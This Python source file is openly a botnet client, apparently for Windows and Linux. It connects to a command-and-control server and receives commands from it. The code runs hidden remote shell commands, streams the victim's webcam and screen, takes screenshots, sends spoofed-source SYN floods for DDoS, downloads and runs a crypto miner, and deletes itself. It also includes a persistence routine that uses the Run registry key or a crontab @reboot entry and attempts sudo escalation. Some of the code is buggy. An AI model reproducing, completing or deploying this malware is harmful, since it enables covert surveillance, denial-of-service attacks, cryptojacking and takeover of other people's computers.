import asyncio
import winreg as reg
import os
import sys
import ctypes
import random
import socket
import ipaddress
import struct
import subprocess
import cv2
import pyautogui
import numpy as np

HOST, PORT = ('127.0.0.1', 80)

reader:asyncio.StreamReader = None
writer:asyncio.StreamWriter = None

def get_arg(tokens:list, arg_token:str):
    return str(tokens[tokens.index(arg_token) + 1])

async def setup():
    await try_connect_to_server()
    #get_persistance_and_admin() #! REMOVE WHEN '#' RELEASE

# Startup + admin priv for windows and unix systems
def get_persistance_and_admin():
    if os.name == "nt":
        
        # Set up keys and paths
        key = r"Software\Microsoft\Windows\CurrentVersion\Run"
        app_name = os.path.basename(sys.argv[0])
        app_path = os.path.abspath(sys.argv[0])
        reg_path = r"HKCU\{}".format(key)

        try:
            # Check if the registry key already exists
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(reg_key, app_name)
            reg.CloseKey(reg_key)

            # Check if the RunAsAdmin key already exists
            reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_READ)
            value, regtype = reg.QueryValueEx(reg_key, f"{app_name}_RunAsAdmin")
            reg.CloseKey(reg_key)

            print(f"{app_name} is already set to run on startup and as administrator.")
        except FileNotFoundError:
            try:
                # If the registry key doesn't exist, create it
                reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                reg.SetValueEx(reg_key, app_name, 0, reg.REG_SZ, app_path)
                reg.CloseKey(reg_key)

                # Check if the application has admin privileges
                if ctypes.windll.shell32.IsUserAnAdmin():
                    reg_key = reg.OpenKey(reg.HKEY_CURRENT_USER, key, 0, reg.KEY_SET_VALUE)
                    reg.SetValueEx(reg_key, f"{app_name}_RunAsAdmin", 0, reg.REG_SZ, "1")
                    reg.CloseKey(reg_key)

                    print(f"{app_name} has been set to run as administrator during startup.")
                else:
                    print(f"{app_name} will run on startup, but it doesn't have admin privileges.")
            except Exception as e:
                print(f"Error occurred: {e}")
    else:        
        # Get the script added to startup
        script_path = os.path.abspath(sys.argv[0])
        # Add the script to the user's crontab to run at startup
        cron_command = f'@reboot /usr/bin/python3 {script_path}\n'
        with open('/tmp/cron_job', 'w') as cron_file:
            cron_file.write(cron_command)
        subprocess.run(['crontab', '/tmp/cron_job'], check=True)
        os.remove('/tmp/cron_job')
        
        # Make the script run with elevated privileges
        script_path = os.path.abspath(sys.argv[0])
        # Check if the script is already running with elevated privileges
        if os.geteuid() == 0:
            print("Already running with elevated privileges.")
        else:
            # Re-run the script using sudo to get elevated privileges
            sudo_command = f'sudo /usr/bin/python3 {script_path}'
            subprocess.run(sudo_command, shell=True, check=True)

# Ran when trying to connect, and if the connection is failed
async def try_connect_to_server():
    global reader, writer
    
    try:
        reader, writer = await asyncio.wait_for(asyncio.open_connection(HOST, PORT), timeout=5)
        print("(+) Connected")
        
        await connected_to_server()
        await try_connect_to_server()
    except (ConnectionRefusedError, TimeoutError):
        print("(-) Couldn't connect to the server")
    except Exception as e:
        print(f"(-) Error connecting: {e}")
    finally:
        await try_connect_to_server()
    
# Ran when the client is connected to the server, this function handles all the comms
async def connected_to_server():
    stream_cam_task_flag = asyncio.Event()
    stream_screen_task_flag = asyncio.Event()
    
    
    # Check for messages from the server
    while True:
        data = await reader.read(1024)
        if not data:
            break
        
        # Ready the commands
        tokens = data.decode().split()
        command = tokens[0]
        
        # Debug reasons
        print(tokens)
        print(command)
        
        # All the commands are run from here
        if command == "delete_self":
            await delete_self()
        
        elif command == "flood":
            flood_task = asyncio.create_task(flood(tokens))
        
        elif command == "stop_flood":
            flood_task.cancel()
            await flood_task
        
        elif command == "shell":
            tokens = tokens[1:]
            await shell(tokens)
        
        elif command == "stream_cam":
            stream_cam_task_flag.clear()
            asyncio.create_task(stream_cam(stream_cam_task_flag))
        
        elif command == "stop_stream_cam":
            stream_cam_task_flag.set()
        
        elif command == "miner": 
            miner(tokens)
        
        elif command == "screenshot":
            await take_screenshot()
            
        elif command == "stream_screen":
            stream_screen_task_flag.clear()
            asyncio.create_task(stream_screen(stream_screen_task_flag))
            
        elif command == "stop_stream_screen":
            stream_screen_task_flag.set()

# Incase the server removes the client from the botnet, then delete the file + forceclose the program          
async def delete_self():
    writer.close()
    await writer.wait_closed()
    self_path = os.path.realpath(__file__)
    #os.remove(self_path) #! REMOVE # WHEN WHEN RELEASING
    os._exit(0)
            
# Can be used for a DDos attack
async def flood(tokens:list):
    while True:
        try:
            # Set up the arguments
            target_ip = get_arg(tokens, "-ip")
            target_port = get_arg(tokens, "-port")
            
            source_port = random.randint(1024, 65535)
            
            #Set up a raw socket, so we can specify our own IP and TCP Header
            raw_socket = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            raw_socket.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            #Craft IP header
            source_ip = str(ipaddress.IPv4Address(random.randint(0, 2**32)))
            ip_header = b'\x45\x00\x00\x28' + b'\xab\xcd\x00\x00' + b'\x40\x06\x00\x00' + socket.inet_aton(source_ip) + socket.inet_aton(target_ip)
            
            #Craft TCP header
            syn_packet = b'\x00\x00' + struct.pack('!HH', source_port, int(target_port)) + b'\x00\x00\x00\x00\x00\x00\x00\x00\x50\x02\x00\x00' + b'\x00\x00\x00\x00'
            
            #Send SYN packet
            raw_socket.sendto(ip_header + syn_packet, (target_ip, int(target_port)))
            
            print("SYN packet sent")
        except Exception as e:
            print(f"Error sending SYN packet: {e}")
        except asyncio.CancelledError:
            print("Flooding was stopped by the server")
        await asyncio.sleep(0.01)

# Stream the webcam via OpenCv, then encode to .jpg, then write to server
async def stream_cam(stop_flag:asyncio.Event):
    try:
        # Captures the webcam
        cap = cv2.VideoCapture(0)
        
        # If the stop_flag.is_set() == true, then the camera should stop streaming
        while not stop_flag.is_set():
            ret, frame = cap.read()

            # If there is nothing captured it should break the while loop
            if not ret:
                break
            
            # Encode the frame and convert it to bytes
            _, encoded_frame = cv2.imencode(".jpg", frame)
            frame_bytes = encoded_frame.tobytes()
            
            # Create the net packet and send to the server
            header = f"stream-cam-marker:byte-length:{len(frame_bytes)}".encode()
            data = header + b"\n" + frame_bytes
            writer.write(data)
            await writer.drain()
    except Exception as e:
        print(e)
        pass

# Running and sending the output of shell commands
async def shell(tokens:list):
    command = " ".join(tokens)
    
    try: 
        # Try running the shell command that the server has sent
        result = subprocess.run(f"cmd.exe /C {command}", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
        stdout = result.stdout
        stderr = result.stderr
        server_response = ""
        
        # Formatting the response
        for line in stdout.splitlines():
            server_response += "\r\n" + line
        
        # If there is an error, pass to the exception
        if stderr:
            server_response = stderr
            pass
        
        # Create and send the net packet, to the server
        header = f"shell-marker:byte-length:{len(server_response.encode())}"
        data = f"{header}\n{server_response}".encode()
        writer.write(data)
        await writer.drain()
    except Exception as e:
        # If 'stderr' is not NONE then send it as an error instead
        print(e)
        writer.write("Does not exist".encode())
        await writer.drain()

# Set up and run a crypto miner
def miner(tokens:list):
    try:
        # Check if git works
        result = subprocess.run(['git', '--version'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        
        if result == False:
            subprocess.run("winget install --id Git.Git -e --source winget")
        
        # Clone the github miner project
        subprocess.run("git clone https://github.com/Lucas310302/Coin-Nest")
        if tokens > 0:
            run_command = f"Coin-Nest/main.py {tokens[1]}"
        else:
            run_command = f"Coin-Nest/main.py"
        
        # Check if there is a token attached or not
        subprocess.run(run_command)
        
        # Create the net packet and send to server
        header = f"miner-marker:byte-length:0"
        response = "Miner Setup and running"
        data = f"{header}\n{response}"
        writer.write(data.encode())
        writer.drain()
    except Exception as e:
        # Incase of error, send the error to the server
        erorr_reponse = f"Miner Error: {e}"
        data = f"{header}\n{erorr_reponse}"
        writer.write(data.encode())
        writer.drain()  
        print(e)

# Grab a screenshot and send it to the server     
async def take_screenshot():
    try:
        # Grab a screenshot the convert it to a format Opencv can work with
        frame = pyautogui.screenshot()
        frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
        
        # Convert the opencv image to bytes
        _, encoded_frame = cv2.imencode(".jpg", frame)
        frame_bytes = encoded_frame.tobytes()
        
        # Create net packet and send to server
        header = f"screenshot-marker:byte-length:{len(frame_bytes)}".encode()
        data = header + b"\n" + frame_bytes
        writer.write(data)
        await writer.drain()
    except Exception as e:
        print(e)
        
async def stream_screen(stop_flag:asyncio.Event):
    try:
        while not stop_flag.is_set():
            # Grab screenshot and convert to OpenCV format
            frame = pyautogui.screenshot()
            frame = cv2.cvtColor(np.array(frame), cv2.COLOR_RGB2BGR)
            
            # Convert image to bytes
            _, encoded_frame = cv2.imencode(".jpg", frame)
            frame_bytes = encoded_frame.tobytes()
            
            # Create net packet and send to server
            header = f"stream-screen-marker:byte-length:{len(frame_bytes)}".encode()
            data = header + b"\n" + frame_bytes
            writer.write(data)
            await writer.drain()
    except Exception as e:
        print(e)
            
            

if __name__ == "__main__":
    asyncio.run(setup())